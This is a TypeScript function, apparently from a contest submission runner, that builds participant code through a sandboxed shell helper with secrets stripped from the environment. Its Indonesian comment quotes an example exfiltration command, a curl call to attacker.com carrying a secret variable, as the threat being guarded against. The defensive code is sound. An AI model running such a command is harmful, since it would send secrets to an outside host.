import { existsSync } from "node:fs";
import { join } from "node:path";
import { shUntrusted } from "../util.js";
import type { Manifest } from "./manifest.js";

// build_cmd datang dari arena.json PESERTA -- ini command arbitrary yang mereka kontrol
// penuh. Jalankan lewat shUntrusted() (env di-strip, TANPA secret job) supaya
// "curl attacker.com?d=$SOME_SECRET" di build_cmd gak bisa exfil apapun dari runner.
export function buildSubmission(dir: string, m: Manifest): { ok: boolean; distPath: string; log: string } {
  const res = shUntrusted(m.build_cmd, dir, 180000);
  const distPath = join(dir, m.dist_dir);
  const hasIndex = existsSync(join(distPath, "index.html"));
  return { ok: res.ok && hasIndex, distPath, log: res.out + (hasIndex ? "" : `\n[dist_dir '${m.dist_dir}/index.html' tidak ditemukan]`) };
}
